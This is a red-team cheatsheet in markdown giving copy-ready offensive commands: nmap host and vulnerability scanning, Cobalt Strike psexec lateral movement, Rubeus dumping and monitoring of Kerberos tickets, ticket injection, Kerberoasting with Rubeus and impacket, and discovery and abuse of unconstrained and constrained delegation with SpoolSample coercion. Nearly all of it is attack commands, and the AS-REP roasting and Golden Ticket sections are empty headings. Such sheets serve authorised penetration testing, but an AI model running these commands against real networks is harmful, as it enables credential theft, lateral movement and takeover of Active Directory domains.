+++
date = "2025-01-01"
title = "RedTeam Cheatsheet"
description = "RedTeam Cheatsheet"
author = "Javier Olmedo"
toc = true
+++

# 🔍 Reconnaissance
## 1️⃣ Nmap
---
Discover hosts
```bash
# Basic
nmap -sn -oA alive -iL scope -vvv

# Full
nmap -sn -n -PR -PE -PA80,443,445,3389 -PS22,80,443 --max-retries 2 --min-parallelism 100 --host-timeout 30s --reason -oA alive -vvv -iL scope

# Extracts alive and count
awk '/Status: Up/{print $2}' alive.gnmap > alive # Only IPs
wc -l alive
```

Scan all ports
```bash
sudo nmap -sSV -p- -Pn -n --open --reason --max-retries 2 --host-timeout 10m --min-rate 500 --scan-delay 50ms  --script "vulners,http-title,http-server-header" --script-args vulners.showall=true,http.useragent="Mozilla/5.0",http.pipeline=1 -T3 -oA all_ports -vvv -iL alive
```

Detect web applications
```bash
sudo nmap -sCV -Pn -n --open -p 80,81,300,443,591,593,832,981,1010,1311,2082,2087,2095,2096,2480,3000,3001,3002,3128,3333,4243,4443,4567,4711,4712,4993,5000,5104,5108,5800,6543,7000,7396,7474,8000,8001,8008,8014,8042,8069,8080,8081,8088,8090,8091,8118,8123,8172,8222,8243,8280,8281,8333,8443,8500,8834,8880,8888,8983,9000,9043,9060,9080,9090,9091,9200,9443,9800,9981,12443,16080,18091,18092,20720,28017 --script "vulners,http-enum,http-headers,http-methods,http-server-header,http-title" --script-args vulners.showall=true,http.useragent="Mozilla/5.0",http.pipeline=1 --min-rate 5000 --max-retries 2 --scan-delay 20ms -T2 -oA all_ports_web -vvv -iL alive
```

Extract Data
```bash
# Extracts ports
grep '22/open' all_ports.gnmap | cut -d ' ' -f 2 > hosts_ssh

# Extracts host+port
grep "22/open" all_ports.gnmap | awk '{match($0, /([0-9]+)\/open\/tcp/, m); print $2 ":" m[1]}' > hosts_port_ssh
```

Beautiful exports
```bash
# wget https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/master/nmap-bootstrap.xsl
# wget https://raw.githubusercontent.com/JavierOlmedo/JavierOlmedo/main/nmap/nmap-bootstrap-deloitte.xsl
xsltproc -o all_ports.html nmap-bootstrap.xsl all_ports.xml # Original
xsltproc -o all_ports.html nmap-bootstrap-deloitte.xsl all_ports.xml # Deloitte
```

Using ligolo
```bash
--unprivileged or -PE
```

# 🏃‍♂️ Lateral movement
## 1️⃣ PsExec
---
```bash
# Cobaltstrike
jump psexec64 <computer> smb
```

# 🐺 Kerberos
## 🎟️ Ticket Handling
---
### 📤Ticket Extraction

> [!danger] 🔴 High privileges to view all tickets

Get Base64 TGT Memory
```bash
# Rubeus Triage
Rubeus.exe triage # Copy LUID with krbtgt, if not krbtgt, is TGS not TGT
Rubeus.exe dump /luid:<LUID> /service:krbtgt /nowrap

# Rubeus Monitor -> Wait for the TGT of a domain administrator to be captured or force spoiler
Rubeus.exe monitor /nowrap
```

### 📥Ticket Injection

Sacrifice
```bash
# CMD -> C:\Windows\System32\cmd.exe
# Powershell -> C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:<domain.local> /username:<username> /password:ThisIsAFakePass /ticket:<Base64_TGT> # steal_token on cobaltstrike
```

### 🔄 Ticket Conversion

Convert Base64 Ticket to kirbi file
```powershell
[IO.File]::WriteAllBytes("c:\users\<username>\<username>.kirbi", [Convert]::FromBase64String("<Base64_TGT>"))
```

## 1️⃣ Kerberoasting
---
🪟
```bash
# Optional
# /outfile:hash_kerberoasting
# /simple
# /spn:"MSSQLSvc/ws01.domain.local:1433" -> 🕵️‍♂️ OPSec
# /spns:<spns.txt>
# /user:<username>
# /domain:<domain>
# /dc:<domain_controller_ip_or_hostname>
# /creduser:<domain.local>\<usernmae>
# /credpassword:<password>
Rubeus.exe kerberoast /format:hashcat /nowrap
```

🐧
```bash
impacket-GetUserSPNs 'domain.local/username:password' -dc-ip <dc_ip_opcional> -request -outputfile hash_kerberoasting -save # Save TGS to disk (.ccache) and hashes
```

## 2️⃣ AS-REP Roasting
---





## 3️⃣ Unconstrained Delegation

🔍 Find Unconstrained Delegation

```bash
# Using cobaltstrike
ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname

# Using ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname

# Powerview
Get-NetComputer -Unconstrained | Select-Object samaccountname, dnshostname

# BloodHound
MATCH (c {unconstraineddelegation:true}) return c
```

💥 Exploiting

- 🏃‍♂️ Lateral movement to unconstrained delegation object
- 🔴 High privileges to view all tickets

```bash
# 1. Get TGT
# using Rubeus.exe triage
# using Rubeus.exe monitor /nowrap
# Force -> SpoolSample.exe <printmachine> <unconstrined_machine>

# 2. Inject Ticket
# Use Sacrifice
```

```

✅ Checking

```bash
ls \\<computer>\c$
```

## 4️⃣ Constrained Delegation

🔍 Find Constrained Delegation

```bash
# Using cobaltstrike
# Only computers
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,dnshostname,msDS-AllowedToDelegateTo

# All
ldapsearch "(msDS-AllowedToDelegateTo=*)" --attributes samAccountName,dnshostname,msDS-AllowedToDelegateTo

# Using ADSearch
ADSearch.exe --search "(|(&(objectCategory=computer)(msds-allowedtodelegateto=*))(objectCategory=user))" --attributes samaccountname,dnshostname,msds-allowedtodelegateto --json

# Powerview
Get-NetComputer -TrustedToAuth | Select-Object samaccountname, dnshostname

# BloodHound
MATCH p=(u)-[:AllowedToDelegate]->(c) RETURN p

# Impacket
findDelegation.py NORTH/arya.stark:Needle -target-domain north.sevenkingdoms.local
```

Get UAC and check
```bash
ldapsearch (&(samaccountname=<vulnerable_samaccountname>)) --attributes userAccountControl # Copy userAccountControl

[System.Convert]::ToBoolean(<userAccountControl> -band 16777216) # If true -> vulnerable

```












## 🎫 Golden Ticket
---
```bash

```
